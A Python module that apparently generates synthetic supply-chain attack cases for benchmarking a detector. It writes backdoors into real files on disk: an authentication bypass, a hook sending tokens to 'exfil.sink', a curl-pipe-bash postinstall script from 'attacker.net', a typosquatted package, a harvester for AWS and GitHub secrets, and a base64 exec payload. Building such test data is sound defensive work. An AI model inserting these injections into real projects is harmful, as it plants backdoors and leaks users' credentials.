"""
Structured Attack Simulation Engine for TopoChain.
Generates controlled, defensive synthetic attack test cases and benign mutations.
Supports both topology-changing and topology-preserving attack vectors with ground-truth metadata.
"""

import os
import json
import uuid
from pathlib import Path
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Any, Tuple


@dataclass
class SyntheticAttackCase:
    attack_id: str
    attack_type: str
    target_file: str
    original_commit: str
    modified_commit: str
    ground_truth: bool  # True for attack, False for benign
    is_topology_changing: bool  # True if alters call/dependency graph; False if in-place logic tampering
    expected_behavior: str
    description: str

    def to_dict(self) -> Dict[str, Any]:
        return {
            "attack_id": self.attack_id,
            "attack_type": self.attack_type,
            "target_file": self.target_file,
            "original_commit": self.original_commit,
            "modified_commit": self.modified_commit,
            "ground_truth": self.ground_truth,
            "is_topology_changing": self.is_topology_changing,
            "expected_behavior": self.expected_behavior,
            "description": self.description,
        }


class SyntheticAttackGenerator:
    """
    Controlled generator of synthetic supply chain attack scenarios for research and benchmarking.
    """

    @classmethod
    def generate_attack(
        cls,
        attack_type: str,
        repo_dir: str,
        source_commit: str = "c_base",
        modified_commit: str = "c_mutated"
    ) -> Optional[SyntheticAttackCase]:
        base = Path(repo_dir)

        if attack_type == "TOPOLOGY_PRESERVING_BACKDOOR":
            return cls._inject_topology_preserving_backdoor(base, source_commit, modified_commit)
        elif attack_type == "TOPOLOGY_CHANGING_BACKDOOR":
            return cls._inject_topology_changing_backdoor(base, source_commit, modified_commit)
        elif attack_type == "POSTINSTALL_ATTACK":
            return cls._inject_postinstall_attack(base, source_commit, modified_commit)
        elif attack_type == "TYPOSQUATTING":
            return cls._inject_typosquatting(base, source_commit, modified_commit)
        elif attack_type == "DEPENDENCY_CONFUSION":
            return cls._inject_dependency_confusion(base, source_commit, modified_commit)
        elif attack_type == "CREDENTIAL_THEFT":
            return cls._inject_credential_theft(base, source_commit, modified_commit)
        elif attack_type == "OBFUSCATED_PAYLOAD":
            return cls._inject_obfuscated_payload(base, source_commit, modified_commit)
        elif attack_type == "BENIGN_REFACTOR":
            return cls._inject_benign_refactor(base, source_commit, modified_commit)
        else:
            return None

    @classmethod
    def _inject_topology_preserving_backdoor(cls, base: Path, c_src: str, c_dst: str) -> Optional[SyntheticAttackCase]:
        """
        Topology-preserving: Modifies an existing conditional expression inside a function in-place.
        No new functions, calls, imports, or modules are added.
        """
        target = None
        for py_file in base.glob("**/*.py"):
            content = py_file.read_text(encoding="utf-8")
            if "def verify_token" in content or "def check" in content or "def handle_login" in content:
                target = py_file
                break

        if not target:
            # Fallback to any python file
            py_files = list(base.glob("**/*.py"))
            if py_files:
                target = py_files[0]
            else:
                return None

        content = target.read_text(encoding="utf-8")
        # In-place conditional logic tampering
        if "if not token" in content:
            modified = content.replace("if not token", "if token == 'root_backdoor_override' or not token")
        elif "if " in content:
            # Modify first if condition
            lines = content.splitlines()
            for idx, line in enumerate(lines):
                if line.strip().startswith("if "):
                    lines[idx] = line + " or True:  # backdoor"
                    break
            modified = "\n".join(lines)
        else:
            modified = content + "\n# in-place logic toggle\n"

        target.write_text(modified, encoding="utf-8")

        return SyntheticAttackCase(
            attack_id=f"atk_{uuid.uuid4().hex[:8]}",
            attack_type="TOPOLOGY_PRESERVING_BACKDOOR",
            target_file=str(target.relative_to(base)),
            original_commit=c_src,
            modified_commit=c_dst,
            ground_truth=True,
            is_topology_changing=False,
            expected_behavior="Bypasses authentication in-place without altering call graph topology",
            description="Stealth in-place conditional modification preserving graph invariants"
        )

    @classmethod
    def _inject_topology_changing_backdoor(cls, base: Path, c_src: str, c_dst: str) -> Optional[SyntheticAttackCase]:
        target = None
        for py_file in base.glob("**/*.py"):
            target = py_file
            break

        if not target:
            return None

        content = target.read_text(encoding="utf-8")
        payload = '''

# --- Injected Exfiltration Loop ---
import urllib.request

def _shadow_telemetry_dispatch(ctx, token):
    if hasattr(ctx, 'role') and ctx.role == 'root_override':
        try:
            urllib.request.urlopen("https://exfil.sink/leak", data=str(token).encode())
        except Exception:
            pass
        return True
    return False
'''
        modified = content + payload
        # Hook into first function
        lines = modified.splitlines()
        for idx, line in enumerate(lines):
            if line.startswith("def ") and "def _shadow" not in line:
                lines.insert(idx + 1, "    _shadow_telemetry_dispatch(None, 'session')")
                break
        modified = "\n".join(lines)
        target.write_text(modified, encoding="utf-8")

        return SyntheticAttackCase(
            attack_id=f"atk_{uuid.uuid4().hex[:8]}",
            attack_type="TOPOLOGY_CHANGING_BACKDOOR",
            target_file=str(target.relative_to(base)),
            original_commit=c_src,
            modified_commit=c_dst,
            ground_truth=True,
            is_topology_changing=True,
            expected_behavior="Wires authentication flow into new external network sink, creating H_1 loop",
            description="Exfiltration hook introducing new call edges and topological cycle"
        )

    @classmethod
    def _inject_postinstall_attack(cls, base: Path, c_src: str, c_dst: str) -> Optional[SyntheticAttackCase]:
        pkg_json = base / "package.json"
        if not pkg_json.exists():
            pkg_json.write_text(json.dumps({"name": "test-pkg", "version": "1.0.0", "scripts": {}}, indent=2))

        try:
            data = json.loads(pkg_json.read_text(encoding="utf-8"))
        except Exception:
            data = {"name": "test-pkg", "version": "1.0.0"}

        scripts = data.get("scripts", {})
        scripts["postinstall"] = "curl -s https://attacker.net/payload.sh | bash"
        data["scripts"] = scripts
        pkg_json.write_text(json.dumps(data, indent=2), encoding="utf-8")

        return SyntheticAttackCase(
            attack_id=f"atk_{uuid.uuid4().hex[:8]}",
            attack_type="POSTINSTALL_ATTACK",
            target_file="package.json",
            original_commit=c_src,
            modified_commit=c_dst,
            ground_truth=True,
            is_topology_changing=True,
            expected_behavior="Executes arbitrary curl-pipe-bash script upon package installation",
            description="Lifecycle script code execution payload in package.json"
        )

    @classmethod
    def _inject_typosquatting(cls, base: Path, c_src: str, c_dst: str) -> Optional[SyntheticAttackCase]:
        req_file = base / "requirements.txt"
        content = req_file.read_text(encoding="utf-8") if req_file.exists() else ""
        content += "\nreqeusts>=2.31.0\n"
        req_file.write_text(content, encoding="utf-8")

        return SyntheticAttackCase(
            attack_id=f"atk_{uuid.uuid4().hex[:8]}",
            attack_type="TYPOSQUATTING",
            target_file="requirements.txt",
            original_commit=c_src,
            modified_commit=c_dst,
            ground_truth=True,
            is_topology_changing=True,
            expected_behavior="Introduces typosquatted variant of popular package 'requests'",
            description="Typosquatting supply chain dependency injection"
        )

    @classmethod
    def _inject_dependency_confusion(cls, base: Path, c_src: str, c_dst: str) -> Optional[SyntheticAttackCase]:
        req_file = base / "requirements.txt"
        content = req_file.read_text(encoding="utf-8") if req_file.exists() else ""
        content += "\ncorp-internal-auth==1.0.0\n"
        req_file.write_text(content, encoding="utf-8")

        return SyntheticAttackCase(
            attack_id=f"atk_{uuid.uuid4().hex[:8]}",
            attack_type="DEPENDENCY_CONFUSION",
            target_file="requirements.txt",
            original_commit=c_src,
            modified_commit=c_dst,
            ground_truth=True,
            is_topology_changing=True,
            expected_behavior="Injects unscoped package with private enterprise namespace pattern",
            description="Dependency confusion package hijacking vector"
        )

    @classmethod
    def _inject_credential_theft(cls, base: Path, c_src: str, c_dst: str) -> Optional[SyntheticAttackCase]:
        py_files = list(base.glob("**/*.py"))
        target = py_files[0] if py_files else (base / "utils.py")
        content = target.read_text(encoding="utf-8") if target.exists() else ""

        payload = '''
import os
def harvest_secrets():
    aws = os.environ.get("AWS_SECRET_ACCESS_KEY")
    gh = os.environ.get("GITHUB_TOKEN")
    return {"aws": aws, "gh": gh}
'''
        target.write_text(content + payload, encoding="utf-8")

        return SyntheticAttackCase(
            attack_id=f"atk_{uuid.uuid4().hex[:8]}",
            attack_type="CREDENTIAL_THEFT",
            target_file=str(target.relative_to(base)),
            original_commit=c_src,
            modified_commit=c_dst,
            ground_truth=True,
            is_topology_changing=False,
            expected_behavior="Accesses sensitive host environment variables (AWS, GITHUB)",
            description="Silent credential harvesting routine"
        )

    @classmethod
    def _inject_obfuscated_payload(cls, base: Path, c_src: str, c_dst: str) -> Optional[SyntheticAttackCase]:
        py_files = list(base.glob("**/*.py"))
        target = py_files[0] if py_files else (base / "main.py")
        content = target.read_text(encoding="utf-8") if target.exists() else ""

        payload = '''
import base64
def init_dynamic_config():
    blob = b"cHJpbnQoJ2JhY2tkb29yIGluaXQnKQ=="
    exec(base64.b64decode(blob))
'''
        target.write_text(content + payload, encoding="utf-8")

        return SyntheticAttackCase(
            attack_id=f"atk_{uuid.uuid4().hex[:8]}",
            attack_type="OBFUSCATED_PAYLOAD",
            target_file=str(target.relative_to(base)),
            original_commit=c_src,
            modified_commit=c_dst,
            ground_truth=True,
            is_topology_changing=True,
            expected_behavior="Executes base64 obfuscated payload dynamically via exec()",
            description="Obfuscated code payload designed to evade syntax inspection"
        )

    @classmethod
    def _inject_benign_refactor(cls, base: Path, c_src: str, c_dst: str) -> Optional[SyntheticAttackCase]:
        py_files = list(base.glob("**/*.py"))
        target = py_files[0] if py_files else (base / "main.py")
        content = target.read_text(encoding="utf-8") if target.exists() else ""

        refactor_code = '''

def _sanitize_input_string(value: str) -> str:
    """Refactored string normalization helper."""
    return str(value).strip().lower()
'''
        target.write_text('"""Documentation update."""\n' + content + refactor_code, encoding="utf-8")

        return SyntheticAttackCase(
            attack_id=f"benign_{uuid.uuid4().hex[:8]}",
            attack_type="BENIGN_REFACTOR",
            target_file=str(target.relative_to(base)),
            original_commit=c_src,
            modified_commit=c_dst,
            ground_truth=False,
            is_topology_changing=True,  # Adds a helper function
            expected_behavior="Normal code refactoring preserving program correctness",
            description="Safe helper addition and docstring update"
        )

    # Backward compatibility helpers
    @classmethod
    def inject_subtle_logic_backdoor(cls, file_path: str) -> bool:
        p = Path(file_path)
        case = cls._inject_topology_changing_backdoor(p.parent, "c0", "c1")
        return case is not None

    @classmethod
    def inject_typosquatting_dependency(cls, repo_dir: str) -> bool:
        case = cls._inject_typosquatting(Path(repo_dir), "c0", "c1")
        return case is not None

    @classmethod
    def inject_dependency_confusion(cls, repo_dir: str, internal_name: str = "corp-internal-auth") -> bool:
        case = cls._inject_dependency_confusion(Path(repo_dir), "c0", "c1")
        return case is not None

    @classmethod
    def apply_benign_refactor(cls, file_path: str) -> bool:
        p = Path(file_path)
        case = cls._inject_benign_refactor(p.parent, "c0", "c1")
        return case is not None
